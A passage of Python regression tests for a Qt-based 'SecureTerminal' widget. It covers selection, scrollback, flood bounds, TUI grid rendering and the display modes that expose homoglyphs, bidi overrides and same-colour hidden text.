_selstick = SecureTerminal(command='/bin/cat', tui=True)
_selstick.resize(700, 300)
_selstick.show()
pump(40)
for _i in range(60):
    _selstick._feed_stream(('row-%d\r\n' % _i).encode())
_selstick._render_tui()
_ss_sent = spy_writes(_selstick)           # the forwarded click reports to the child; capture it
feed_output(_selstick, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h')   # child arms mouse reporting
ok(_selstick._mouse_report_on(),
   'canary: mouse reporting is armed, so a plain click is forwarded (not a local selection)')
_ss_tc = QTextCursor(_selstick.document())
_ss_tc.setPosition(5)
_ss_tc.setPosition(20, QTextCursor.MoveMode.KeepAnchor)
_selstick.setTextCursor(_ss_tc)
ok(_selstick.textCursor().hasSelection(), 'canary: a held selection is established before the click')
_selstick.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton, pos=(50, 50)))
ok(not _selstick.textCursor().hasSelection(),
   'a plain click in a mouse-reporting TUI dismisses a stuck selection before forwarding the click')
_selstick.close()

# Regression (operator, "single line unselectable"): Shift is the mandatory local override to
# bypass the child's mouse grab, but Qt reads Shift+press as EXTEND-from-current-cursor, and the
# render loop pins that cursor to the child's cursor (_place_grid_cursor). Every Shift-drag then
# anchored at the pinned cursor -- a single line was unselectable. mousePressEvent now collapses
# the cursor to the click FIRST, so a Shift bypass-press starts a FRESH selection at the click.
_selfresh = SecureTerminal(command='/bin/cat', tui=True)
_selfresh.resize(700, 300)
_selfresh.show()
pump(40)
for _i in range(60):
    _selfresh._feed_stream(('line-%d\r\n' % _i).encode())
_selfresh._render_tui()
_sf_sent = spy_writes(_selfresh)
feed_output(_selfresh, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h')   # child arms mouse reporting
_sf_click = (80, 40)
_sf_clickpos = _selfresh.cursorForPosition(_QP(*_sf_click)).position()
_sf_far = QTextCursor(_selfresh.document())
_sf_far.setPosition(_selfresh.document().characterCount() - 2)   # pin the cursor FAR, as the render loop does
_selfresh.setTextCursor(_sf_far)
ok(_selfresh._mouse_report_on() and _selfresh.textCursor().position() != _sf_clickpos,
   'canary: mouse reporting is armed and the cursor is pinned FAR from the click')
_selfresh.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                               mods=Qt.KeyboardModifier.ShiftModifier, pos=_sf_click))
eq(_selfresh.textCursor().anchor(), _sf_clickpos,
   'a Shift bypass-press anchors a FRESH selection at the click, not extending from the pinned grid cursor')
_selfresh.close()
# scrollback navigation in line mode: PageUp scrolls the buffer up, Shift+Home/
# End jump to the ends, plain Home is left for line editing (does not scroll)
sc = SecureTerminal(command='/bin/cat')
sc.resize(600, 200)
sc.show()
for _i in range(200):
    sc._append('line %d\n' % _i)
_bar = sc.verticalScrollBar()
_bottom = _bar.value()
key(sc, Qt.Key.Key_PageUp)
ok(_bar.value() < _bottom, 'PageUp scrolls the scrollback up')
key(sc, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.maximum(), 'Shift+End jumps to the bottom')
key(sc, Qt.Key.Key_Home, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.minimum(), 'Shift+Home jumps to the top')
_bar.setValue(50)
key(sc, Qt.Key.Key_Home)
eq(_bar.value(), 50, 'plain Home does not scroll (reserved for editing)')
# flood must not hang: a large control-laden blob (every byte 0x00-0xff, so it
# carries CR/BS/NL) renders in bounded time and bounded document size. This is
# the "cat /dev/random freeze" regression -- the old per-char cursor path took
# minutes; the bulk path is seconds.
import time as _time                                  # noqa: E402
from secure_terminal import sanitize as _S            # noqa: E402
fl = SecureTerminal(command='/bin/cat')
fl.resize(600, 300)
_blob = _S.render_output((bytes(range(256)) * 8000).decode('latin-1'), 'box')


def _append_seconds(widget, text, times=1):
    _t0 = _time.time()
    for _ in range(times):
        widget._append(text)
    return _time.time() - _t0


# SELF-CALIBRATED, because a wall clock is not the invariant. `elapsed < 30` measured
# 48.9s on a loaded box and ~5s idle on identical code: it raced the machine, and a
# security test that cries wolf gets muted.
#
# Comparing against plain text does NOT work either (measured: plain 18.2s vs
# control-laden 15.1s). Plain text is SLOWER, because 25k newlines dominate via
# maximumBlockCount pruning rather than per-character work -- so that ratio could
# never exceed its threshold and the assertion would be incapable of failing.
#
# So calibrate on the SAME content at 1/8 the volume and require the full flood to
# stay near-linear against it. Load scales both measurements. The regression this
# guards (the old per-char cursor path, minutes vs seconds) is superlinear, so it
# would blow the multiplier out by orders of magnitude, while a merely slow machine
# moves both numbers together and still passes.
_small = _blob[:len(_blob) // 8]
_fl_cal = SecureTerminal(command='/bin/cat')
_fl_cal.resize(600, 300)
_t_small = _append_seconds(_fl_cal, _small)
_fl_cal.close()
_elapsed = _append_seconds(fl, _blob, times=2)        # ~4MB of control-laden output
# The flood pushes 16x the calibration volume (8x the text, twice). max() floors a
# machine fast enough to report ~0, which would make the budget zero.
_budget = max(_t_small, 0.05) * 16 * 3               # 3x headroom for pruning + noise
ok(_elapsed < _budget,
   'control-laden flood stays near-linear (%.1fs vs %.1fs budget from a %.2fs '
   'eighth-sample)' % (_elapsed, _budget, _t_small))
# An absolute ceiling too, loose on purpose: it only has to catch a true HANG, which
# no ratio can -- a hang never returns a second measurement to compare.
ok(_elapsed < 120, 'control-laden flood does not hang (%.1fs)' % _elapsed)
ok(fl.document().blockCount() <= 10000,
   'flood document stays bounded (%d blocks)' % fl.document().blockCount())
# keyboard tab navigation: the widget emits tab_step / tab_move so the window can
# switch or reorder tabs (Ctrl+PageUp/Down and the Shift variants)
nav = SecureTerminal(command='/bin/cat')
_steps: list[int] = []
_moves: list[int] = []
nav.tab_step.connect(_steps.append)
nav.tab_move.connect(_moves.append)
key(nav, Qt.Key.Key_PageDown, mods=Qt.KeyboardModifier.ControlModifier)
key(nav, Qt.Key.Key_PageUp,
    mods=Qt.KeyboardModifier.ControlModifier | Qt.KeyboardModifier.ShiftModifier)
eq((_steps, _moves), ([1], [-1]),
   'Ctrl+PageDown steps tab, Ctrl+Shift+PageUp moves tab')
# a display-mode toggle re-renders the WHOLE existing buffer, not only new output
rr = SecureTerminal(command='/bin/cat')
_rr_raw = 'cafe' + chr(0x00E9) + '\n'
rr._raw = _rr_raw
rr._append(_S.render_output(_rr_raw, 'box'))
eq(rr.toPlainText().rstrip(), 'cafe_', 'box shows non-ascii as _')
rr.apply_mode('reveal')
eq(rr.toPlainText().rstrip(), 'cafe<U+00E9>', 'reveal re-renders existing scrollback')
rr.apply_mode('show')
eq(rr.toPlainText().rstrip(), 'cafe' + chr(0x00E9), 'show re-renders existing scrollback')
rr.apply_mode('box')
eq(rr.toPlainText().rstrip(), 'cafe_', 'box re-renders the scrollback back')
# a SAVED transcript is lossless: fed through the real render path (so each box
# carries its source codepoint), Box mode names the byte inline (Detail) with
# line-edits already RESOLVED (a \r overwrite is applied, not concatenated),
# while a copy / plain text still collapses the box to '_'.
_tr = SecureTerminal(command='/bin/cat')
_tr.apply_mode('box')
_tr._feed_line('load 10%\rdone caf\xe9\n')     # \r overwrite, then a homoglyph
eq(_tr.toPlainText().rstrip(), 'done caf_',
   'box display/copy: the \\r overwrite is resolved and the box maps to "_"')
eq(_tr.transcript_text().rstrip(), 'done caf<U+00E9 LATIN SMALL LETTER E WITH ACUTE>',
   'box transcript: line edits resolved AND the codepoint named (lossless), not "_"')
_tr.shutdown()
# a REAL U+25A1 the program printed is kept as its glyph in Show mode -- it is not
# a neutralization placeholder, so a saved transcript must not rewrite it to a
# <U+25A1 ...> badge or '_' (the _export_ascii Show invariant). A neutralized
# no-glyph char shown as a box still names its own (different) codepoint.
_trs = SecureTerminal(command='/bin/cat')
_trs.apply_mode('show')
_trs._feed_line('a' + chr(0x25A1) + chr(0x202E) + 'b\n')   # real box + bidi override
_ts = _trs.transcript_text()
ok(chr(0x25A1) in _ts and 'U+25A1' not in _ts,
   'show transcript: a real U+25A1 glyph is kept, not rewritten as a placeholder')
ok('U+202E' in _ts,
   'show transcript: a neutralized bidi shown as a box still names its codepoint')
_trs.shutdown()
# a mode toggle after a flood re-renders only the recent tail, not the full
# scrollback: reveal expands each byte to an 8-char <U+XXXX>, so re-rendering 1MB
# of raw would be ~8MB and freeze the UI. Bounded, the document stays small.
rf = SecureTerminal(command='/bin/cat')
rf._raw = (b''.join(bytes([i % 256]) for i in range(1000)) * 1000).decode('latin-1')
rf.apply_mode('reveal')
ok(len(rf.toPlainText()) < 1_200_000,
   'mode toggle re-renders only the bounded tail, not the whole 8MB expansion')
# regression: switching CLI<->TUI at a shell prompt must NOT blank the scrollback.
# TUI only takes over the screen while a full-screen program is on the alt screen;
# with just a shell it stays in line display, so toggling is a visual no-op and
# the history survives. (Fixed a bug where apply_tui() rendered a blank pyte grid
# over the scrollback the moment TUI was enabled.)
sw = SecureTerminal(command='/bin/cat')
_scroll = 'history-line-A\nhistory-line-B\nhistory-line-C\n'
sw._raw = _scroll
sw._append(_S.render_output(_scroll, 'box'))
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'scrollback present in CLI mode')
sw.apply_tui(True)
ok('history-line-A' in sw.toPlainText(),
   'CLI->TUI at a shell prompt keeps the scrollback (not blanked)')
sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText(), 'TUI->CLI keeps the scrollback')
for _ in range(5):
    sw.apply_tui(True)
    sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'repeated CLI<->TUI toggling preserves the scrollback (solid)')
# and when a full-screen program DOES take the grid then exits, the scrolling
# document is rebuilt from retained output (only runs where pyte is installed).
sw.apply_tui(True)
if sw.current_tui():
    sw._alt_screen = True
    sw._sync_display()                      # a full-screen program takes the grid
    sw._alt_screen = False
    sw._sync_display()                      # it exits -> scrollback rebuilt
    ok('history-line-A' in sw.toPlainText(),
       'scrollback restored after a full-screen program exits')
sw.apply_tui(False)
# regression: applying an UNRELATED global setting must not erase TUI scrollback.
# _apply_global re-applies the SAME scrollback value to every tab on every global-
# settings change (theme, font, zoom, ...). apply_scrollback used to unconditionally
# clear the document and rebuild the TUI view from pyte's bounded history (cap 2000),
# so any promoted scrollback row ABOVE that cap -- which exists only in the document --
# was silently dropped. With the default scrollback (10000 > pyte's 2000 cap) that
# erased visible history on an unrelated setting change.
_sb = SecureTerminal(command='/bin/cat', tui=True)
if _sb.current_tui():
    _sb.show()
    _sb.resize(800, 400)                             # a real viewport so the grid renders
    _sbN = 2300                                      # > pyte's 2000-line history cap
    # Feed in chunks and pump so the debounced grid render (_render_timer) fires and
    # promotes each scrolled-off batch into the document; a single feed larger than
    # pyte's history would overflow it before the promote pass runs.
    for _sbi in range(0, _sbN, 100):
        feed_output(_sb, ''.join('row-%04d\n' % i
                                 for i in range(_sbi, min(_sbi + 100, _sbN))).encode('ascii'))
        pump(20)
    pump(50)
    # setup canary: the oldest rows live ONLY in the document (pyte kept the last
    # ~2000), proving the document holds more than pyte's history cap.
    ok('row-0000' in _sb.toPlainText(),
       'TUI scrollback: the oldest promoted row is retained in the document')
    _sbBlocks = _sb.blockCount()
    # apply the SAME scrollback -- exactly what _apply_global does on any unrelated
    # setting. The destructive rebuild must NOT fire: nothing was pruned.
    _sb.apply_scrollback(_sb.current_scrollback())
    ok('row-0000' in _sb.toPlainText(),
       'apply_scrollback(unchanged) keeps the promoted scrollback (no destructive rebuild)')
    eq(_sb.blockCount(), _sbBlocks,
       'apply_scrollback(unchanged) does not shrink the document')
    # a RAISE prunes nothing either, so it too must preserve the promoted rows.
    _sb.apply_scrollback(_sb.current_scrollback() * 2)
    ok('row-0000' in _sb.toPlainText(),
       'apply_scrollback(raise) preserves the promoted scrollback (no prune, no rebuild)')
    # a genuine REDUCTION below the document size prunes and resyncs the grid model.
    _sb.apply_scrollback(500)
    eq(_sb.current_scrollback(), 500, 'apply_scrollback(reduce) applies the new cap')
    ok(_sb.blockCount() <= 500,
       'apply_scrollback(reduce) prunes the document to the new cap')
_sb.close()

# regression (#7): a debounced CLI paint must NOT survive entry into the TUI grid.
# _sync_display is reached directly from apply_tui (not via _rerender), so a still-
# armed _paint_timer would fire _flush_paint AFTER the grid is built and write stale
# CLI content into the grid document, corrupting it. Pre-fix the timer stayed armed.
pw = SecureTerminal(command='/bin/cat')
pw.apply_tui(True)
if pw.current_tui():
    pw._paint_dirty = True
    pw._paint_timer.start(0)                # arm the CLI paint debounce
    ok(pw._paint_timer.isActive(), 'a CLI paint is armed before the grid takes over')
    pw._alt_screen = True
    pw._sync_display()                      # a full-screen program takes the grid
    ok(not pw._paint_timer.isActive() and not pw._paint_dirty,
       'grid entry drops the pending CLI paint (no stale _flush_paint corrupts the grid)')
    pw._alt_screen = False
pw.apply_tui(False)
# CLI->TUI grid fits the viewport: no useless horizontal scrollbar and no clipped
# right edge. The grid must be sized to the text AREA (viewport minus the doc
# margins): the raw viewport is one column too wide and overflows.
gz = SecureTerminal(command='/bin/cat')
gz.resize(820, 400)
gz.show()
pump(40)
ok(gz.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAsNeeded,
   'the horizontal scrollbar is AS-NEEDED (kept only for expanded-Unicode overflow)')
ok(gz.horizontalScrollBar().maximum() == 0,
   'a grid that fits the viewport shows no horizontal scrollbar (nothing to scroll)')
_gcols, _grows = gz._tui_grid_size()
_gcw = gz.fontMetrics().horizontalAdvance('M') or 1
_gmargin = int(gz.document().documentMargin())
_gvbar = gz.verticalScrollBar().width() if gz.verticalScrollBar().isVisible() else 0
ok(_gcols * _gcw <= gz.viewport().width() - 2 * _gmargin + _gvbar,
   'the TUI grid columns fit the text area, so the grid never overflows sideways')
# --- TUI is a full emulator: primary-screen redraws (completion menus), CLI<->TUI
# scrollback, and full-screen apps all render (only where pyte is installed) ------
if tui_available():
    # a completion-menu style cursor-up redraw OVERWRITES the listing line instead
    # of piling up (the whole point of #184: the grid honours cursor-up)
    _mprog = os.path.join(tempfile.mkdtemp(prefix='st-menu-'), 'menu.sh')
    with open(_mprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'printf "prompt> cd \\n"\n'
                 'printf "dirA  dirB\\n"\n'
                 'printf "\\033[Aprompt> cd dirA\\033[K\\n"\n'   # cursor up + redraw
                 'sleep 3\n')
    os.chmod(_mprog, 0o700)
    _mt = SecureTerminal(command=_mprog, tui=True)
    _mt.resize(600, 300)
    _mt.show()
    pump(400)
    _mlines = [ln.rstrip() for ln in _mt.toPlainText().split('\n') if ln.strip()]
    ok('prompt> cd dirA' in _mlines and 'dirA  dirB' not in _mlines,
       'a cursor-up redraw (completion menu) overwrites in the grid, not piles up')
    # CLI->TUI keeps the scrollback (seeded from retained output), and TUI->CLI
    # keeps the output produced while in TUI
    _hprog = os.path.join(tempfile.mkdtemp(prefix='st-hist-'), 'h.sh')
    with open(_hprog, 'w') as _f:
        _f.write('#!/bin/sh\nfor i in 1 2 3 4 5; do echo "scrollback-$i"; done\nsleep 3\n')
    os.chmod(_hprog, 0o700)
    _ht = SecureTerminal(command=_hprog)          # start in CLI
    _ht.resize(600, 300)
    _ht.show()
    pump(400)
    ok('scrollback-3' in _ht.toPlainText(), 'output present in CLI mode')
    _ht.apply_tui(True)
    pump(120)
    ok('scrollback-3' in _ht.toPlainText(),
       'CLI->TUI keeps the scrollback (grid seeded from retained output)')
    # a full-screen program (alternate screen) is restored on exit: its frame does
    # not pollute the scrollback and the pre-program screen comes back
    _fprog = os.path.join(tempfile.mkdtemp(prefix='st-fs-'), 'fs.sh')
    with open(_fprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'echo primary-content\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049h\\033[2J\\033[HFULLSCREEN-FRAME"\n'
                 'sleep 0.4\n'
                 'printf "\\033[?1049l"\n'
                 'sleep 3\n')
    os.chmod(_fprog, 0o700)
    _ft = SecureTerminal(command=_fprog, tui=True)
    _ft.resize(600, 300)
    _ft.show()
    pump(1100)
    _ftext = _ft.toPlainText()
    ok('FULLSCREEN-FRAME' not in _ftext,
       'a full-screen program frame does not pollute the scrollback on exit')
    ok('primary-content' in _ftext,
       'the pre-program primary screen is restored when a full-screen app exits')
    # a tab that STARTS in TUI with restored scrollback keeps it, sets grid state,
    # and rebuilds the line document when switched to CLI (codex P1).
    _st = SecureTerminal(command='/bin/cat', tui=True, history='restored-scrollback\n')
    _st.resize(600, 300)
    _st.show()
    pump(120)
    ok(_st._grid_shown and 'restored-scrollback' in _st.toPlainText(),
       'a tab starting in TUI seeds its restored scrollback into the grid')
    _st.apply_tui(False)
    pump(60)
    ok('restored-scrollback' in _st.toPlainText(),
       'switching a TUI-started tab to CLI rebuilds the line document (keeps history)')
    # the shell's prompt that arrives in the SAME read as the alt-screen leave is
    # fed onto the restored primary, not discarded (codex P1).
    _pprog = os.path.join(tempfile.mkdtemp(prefix='st-lp-'), 'lp.sh')
    with open(_pprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'sleep 0.2\n'
                 'printf "\\033[?1049h\\033[2J\\033[HAPP"\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049lPROMPT-AFTER-LEAVE\\$ "\n'
                 'sleep 3\n')
    os.chmod(_pprog, 0o700)
    _pt = SecureTerminal(command=_pprog, tui=True)
    _pt.resize(600, 300)
    _pt.show()
    pump(900)
    ok('PROMPT-AFTER-LEAVE' in _pt.toPlainText(),
       'bytes after an alt-screen leave (the next prompt) land on the restored screen')
    # a scrollback cap smaller than the grid must not wipe the document (codex P2:
    # _grid_rows tracks ACTUAL blocks, so _delete_grid never goes negative).
    _tt = SecureTerminal(command='/bin/cat', tui=True)
    _tt.apply_scrollback(5)                # far smaller than the grid's row count
    _tt.resize(600, 400)
    _tt.show()
    pump(60)
    for _i in range(30):
        _tt._feed_stream(('grid-line-%d\r\n' % _i).encode())
    _tt._render_tui()                      # must not crash or blank the document
    ok(_tt.document().blockCount() >= 1 and _tt._grid_rows <= _tt.document().blockCount(),
       'a tiny scrollback cap does not corrupt the grid render')
    # the alt-screen split loop in _feed_stream always terminates: each iteration
    # advances past a marker (>= 6 bytes) or to the end -- feed pathological input
    # (back-to-back and empty-segment markers) and it must not hang or crash.
    _at = SecureTerminal(command='/bin/cat', tui=True)
    _at.resize(400, 200)
    _altmk = [b'\x1b[?1049h', b'\x1b[?1049l', b'\x1b[?47h', b'\x1b[?47l']
    for _combo in (b''.join(_altmk), b''.join(_altmk * 3), b'x' + b''.join(_altmk) + b'y',
                   b'\x1b[?1049h\x1b[?1049h\x1b[?1049l', b'', b'\x1b[?10', b'49h'):
        _at._feed_stream(_combo)          # returns (bounded) or the test would hang
    _at._render_tui()
    ok(_at.document().blockCount() >= 1,
       'the alt-screen split feed loop terminates on pathological marker input')
    # window resize keeps the pyte grid and the pty winsize in step (SIGWINCH), so
    # a TUI program repaints at the new width, and resizing while scrolled up does
    # not crash the incremental renderer.
    import fcntl as _fcntl, termios as _termios, struct as _struct     # noqa: E402
    _rt = SecureTerminal(command='/bin/cat', tui=True)
    _rt.resize(500, 300)
    _rt.show()
    pump(60)
    _small = _rt._screen.columns
    _rt.resize(1100, 600)
    pump(60)
    _grown = _rt._screen.columns
    _ws = _struct.unpack('HHHH', _fcntl.ioctl(
        _rt._fd, _termios.TIOCGWINSZ, _struct.pack('HHHH', 0, 0, 0, 0)))
    ok(_grown > _small and _ws[1] == _grown,
       'resize grows the pyte grid and updates the pty winsize (cols) together')
    for _i in range(200):
        _rt._feed_stream(('rsb-%d\r\n' % _i).encode())
    _rt._render_tui()
    _rbar = _rt.verticalScrollBar()
    _rbar.setValue(_rbar.maximum() // 2)
    _rt.resize(700, 450)               # resize while scrolled up: must not crash
    pump(40)
    ok(_rt.document().blockCount() >= 1, 'resizing while scrolled up does not crash')

    # Bug #64: the primary-screen grid trims trailing blank rows below the cursor,
    # so the document ends at the last output line (no scrolling into empty space).
    _pad = SecureTerminal(command='/bin/cat', tui=True)
    _pad.resize(700, 400)
    _pad.show()
    pump(40)
    _pad.apply_mode('show')
    _pad._feed_stream(b'\x1b[2J\x1b[1;1Hline1\r\nline2\r\nprompt$ ')
    _pad._render_tui()
    ok(_pad.toPlainText().split('\n')[-1].startswith('prompt$'),
       'TUI document ends at the last output line, no blank grid padding below it')
    ok(_pad.document().blockCount() <= 4,
       'TUI grid is trimmed to the cursor row, not the full screen height')
    _pad.close()

    # Bug #65: TUI auto-scrolls to the newest output when already at the bottom, but
    # does NOT yank a scrolled-up view back down.
    _fol = SecureTerminal(command='/bin/cat', tui=True)
    _fol.resize(700, 300)
    _fol.show()
    pump(40)
    for _i in range(80):
        _fol._feed_stream(('scrollback-%d\r\n' % _i).encode())
    _fol._render_tui()
    _fbar = _fol.verticalScrollBar()
    ok(_fbar.maximum() > 0, 'TUI scrollbar has range (content exceeds the viewport)')
    _fbar.setValue(_fbar.maximum())
    _fol._feed_stream(b'newest-line\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _fbar.maximum(),
       'TUI auto-scrolls to the newest output when already at the bottom')
    _fbar.setValue(_fbar.maximum() // 2)
    _held = _fbar.value()
    _fol._feed_stream(b'more-output\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _held,
       'TUI does not yank a scrolled-up view back to the bottom')
    # Regression (operator report): a ONE-line scroll-up must not be yanked back either. The
    # old `>= maximum - 2` tolerance mistook value==maximum-1 for "at bottom" and snapped the
    # view to the tail on the next frame (the reported scroll flicker). FAILS on the old code:
    # value would return to maximum.
    _fbar.setValue(_fbar.maximum())          # re-enter auto-follow
    _fol._render_tui()
    _one_up = _fbar.maximum() - 1
    _fbar.setValue(_one_up)                  # user wheels up a single line
    _fol._feed_stream(b'and-more\r\n')       # new output keeps arriving
    _fol._render_tui()
    ok(_fbar.value() < _fbar.maximum(),
       'a one-line scroll-up is not yanked back to the bottom (no scroll flicker)')
    # ...and returning to the very bottom RESUMES auto-follow.
    _fbar.setValue(_fbar.maximum())
    _fol._feed_stream(b'tail-again\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _fbar.maximum(),
       'returning to the bottom resumes TUI auto-follow')
    _fol.close()

# --- TUI grid: DEC line-drawing renders, and neutralized cells are risk-coloured -
# pyte's ByteStream runs in UTF-8 mode, where it treats an `ESC ( 0` DEC
# line-drawing designation as a no-op, so a curses program's box borders used to
# arrive as literal `lqqqk` text. _Utf8CharsetByteStream re-arms the designation
# (still UTF-8-decoding), so the grid draws the real box-drawing glyphs.
from secure_terminal.terminal import (_CP_PROP as _CPP, BOX as _BX,   # noqa: E402
                                       _GridRow as _GR)


def _cell_fmt(term, idx):
    """The effective (QTextCharFormat, source codepoint) painting the grid cell at
    document position idx: from the block's _GridRow in TUI grid mode (the layout
    formats the highlighter paints are not queryable via charFormat), else the
    char format in CLI line mode."""
    _blk = term.document().findBlock(idx)
    _off = idx - _blk.position()
    _data = _blk.userData()
    if isinstance(_data, _GR):
        for _start, _length, _fmt, _cp in _data.runs:
            if _start <= _off < _start + _length:
                return _fmt, _cp
    _c = QTextCursor(term.document())
    _c.setPosition(idx)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    _f = _c.charFormat()
    return _f, _f.property(_CPP)


def _grid_cell(term, idx):
    """(display char, source codepoint tag, foreground name) for a grid cell.
    selectedText() is the RAW document glyph (the box placeholder), not the
    export form (toPlainText maps the box back to '_')."""
    _c = QTextCursor(term.document())
    _c.setPosition(idx)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    _fmt, _cp = _cell_fmt(term, idx)
    return _c.selectedText(), _cp, _fmt.foreground().color().name()


# Q1 SHOW mode: `ESC ( 0 lqk ESC ( B` becomes real box-drawing glyphs, not `lqk`.
_dsh = SecureTerminal(command='/bin/cat', tui=True)
_dsh.apply_mode('show')
_dsh.resize(600, 300)
_dsh.show()
pump(60)
_dsh._feed_stream(b'A\x1b(0lqk\x1b(BZ\r\n')   # 'A'/'Z' plain program cells bracket the box-drawing
_dsh._render_tui()
pump(30)
_dshtxt = _dsh.toPlainText()
ok(any(0x2500 <= ord(c) <= 0x257F for c in _dshtxt),
   'Q1 show: DEC line-drawing (ESC(0 lqk) renders real box-drawing glyphs')
ok('lqk' not in _dshtxt, 'Q1 show: the DEC letters are no longer shown as literal ASCII')
# a structural cell takes the program-SGR branch (a COPY of the cached _pyte_format
# format, tagged with _CP_PROP); the copy must not pollute the shared cached format,
# or a later plain-ASCII cell of the same SGR would falsely report the box codepoint.
_zi = _dshtxt.index('Z')                    # a default-SGR ASCII cell AFTER the box-drawing
ok(_grid_cell(_dsh, _zi)[1] is None,
   'a plain ASCII cell after a structural cell carries no codepoint tag (shared format not polluted)')
# a shown box-drawing glyph is structure, not a deception (it cannot pose as ASCII,
# hide or reorder), so it renders as its real glyph in the PROGRAM's OWN colour --
# NOT a risk-class tint -- while still carrying its source codepoint for inspection.
# The plain 'A' cell gives the program's colour to compare against.
_ai = _dshtxt.index('A')
_ach, _acp, _afg = _grid_cell(_dsh, _ai)
_bdi = next(i for i, c in enumerate(_dshtxt) if 0x2500 <= ord(c) <= 0x257F)
_bdch, _bdcp, _bdfg = _grid_cell(_dsh, _bdi)
ok(0x2500 <= ord(_bdch) <= 0x257F, 'Q1 show: the cell holds the real box-drawing glyph')
eq(_bdcp, ord(_bdch), 'Q2 show: a shown box-drawing glyph carries its own codepoint (inspectable)')
eq(_bdfg.lower(), _afg.lower(),
   'Q2 show: a shown box-drawing glyph wears the PROGRAM colour (structural, like a real terminal)')
ok(_bdfg.lower() != mark_fg(_dsh, 'nonascii').lower(),
   'Q2 show: a shown box-drawing glyph is NOT painted the non-ASCII risk colour')
_dsh.close()
# #7: a child announcing UTF-8 mode (ESC%G / ESC%8) must NOT re-break DEC line-drawing. pyte's
# base ByteStream.select_other_charset flips use_utf8 back True for ESC%G, which re-arms the
# "ESC(0 is a no-op" path so borders render as literal 'lqk' again (GNU screen announces UTF-8
# this way). _Utf8CharsetByteStream overrides it to a no-op, keeping the charset path armed.
_dg = SecureTerminal(command='/bin/cat', tui=True)
_dg.apply_mode('show')
_dg.resize(600, 300)
_dg.show()
pump(60)
_dg._feed_stream(b'\x1b%GA\x1b(0lqk\x1b(BZ\r\n')   # ESC%G (announce UTF-8) THEN the line-drawing
_dg._render_tui()
pump(30)
_dgtxt = _dg.toPlainText()
ok(any(0x2500 <= ord(c) <= 0x257F for c in _dgtxt),
   '#7: a UTF-8-mode announce does not disarm DEC line-drawing -- box-drawing still renders')
ok('lqk' not in _dgtxt, '#7: after a UTF-8-mode announce the DEC letters are still not literal ASCII')
_dg.close()

# Q2 show: a homoglyph shown as its glyph wears the LOUDER confusable colour, so a
# Cyrillic 'a' posing as Latin stands out even while its glyph is readable.
_hsh = SecureTerminal(command='/bin/cat', tui=True)
_hsh.apply_mode('show')
_hsh.resize(600, 300)
_hsh.show()
pump(60)
_hsh._feed_stream(('p' + chr(0x0430) + 'y\r\n').encode())        # Cyrillic small a
_hsh._render_tui()
pump(30)
_hi = _hsh.toPlainText().index(chr(0x0430))
_hch, _hcp, _hfg = _grid_cell(_hsh, _hi)
eq(_hcp, 0x0430, 'Q2 show: a shown homoglyph carries its source codepoint')
eq(_hfg.lower(), mark_fg(_hsh, 'confusable').lower(),
   'Q2 show: a shown homoglyph is tinted with the louder confusable risk colour')
_hsh.close()

# Q1 BOX mode: DEC line-drawing is neutralized to the box placeholder (strict), and
# Q2: that neutralized cell is coloured by risk class and carries its source cp.
_dbx = SecureTerminal(command='/bin/cat', tui=True)
_dbx.apply_mode('box')
_dbx.resize(600, 300)
_dbx.show()
pump(60)
_dbx._feed_stream(b'\x1b(0lqqk\x1b(B\r\n')                 # repeated q -> repeated cell
_dbx._render_tui()
pump(30)
_dbxtxt = _dbx.toPlainText()
ok('lqqk' not in _dbxtxt, 'Q1 box: DEC line-drawing is not shown as literal ASCII')
ok('_' in _dbxtxt, 'Q1 box: DEC line-drawing is neutralized (exported as _)')
_bi = _dbxtxt.index('_')
_disp, _cp, _fg = _grid_cell(_dbx, _bi)
eq(_disp, _BX, 'Q2 box: the neutralized cell is the box placeholder glyph')
ok(_cp is not None and 0x2500 <= _cp <= 0x257F,
   'Q2 box: the box cell carries the SOURCE box-drawing codepoint (not U+25A1)')
eq(_fg.lower(), mark_fg(_dbx, 'nonascii').lower(),
   'Q2 box: a boxed box-drawing cell wears the non-ASCII risk colour')
_dbx.close()

# The structural contrast-guard bypass is Show-ONLY. In a strict mode a structural glyph
# is NEUTRALIZED to a placeholder, so the guard must stay -- else a program that painted
# it fg==bg would render the placeholder invisible, defeating the neutralization the strict
# mode exists for. Box mode + markings OFF (the program-SGR branch) + a red-on-red full
# block. FAILS pre-fix, where the bypass came from the source glyph regardless of display.
def _cell_fg_bg(term, idx):
    _cf, _ = _cell_fmt(term, idx)
    _fg = _cf.foreground().color().name().lower()
    _bg = (_cf.background().color().name().lower()
           if _cf.background().style() != Qt.BrushStyle.NoBrush else None)
    return _fg, _bg


_RED_ON_RED = b'\x1b[38;2;200;0;0;48;2;200;0;0m' + '\u2588'.encode() + b'\x1b[0m\r\n'
_sgb = SecureTerminal(command='/bin/cat', tui=True)
_sgb.apply_mode('box')
_sgb.apply_markings(False)          # the program-SGR branch (no risk tint)
_sgb.apply_colors(True)
_sgb.resize(600, 300)
_sgb.show()
pump(60)
_sgb._feed_stream(_RED_ON_RED)
_sgb._render_tui()
pump(30)
_sbfg, _sbbg = _cell_fg_bg(_sgb, _sgb.toPlainText().index('_'))
ok(_sbfg != _sbbg,
   'box mode: a neutralized structural glyph keeps the contrast guard (fg==bg cannot hide the placeholder)')
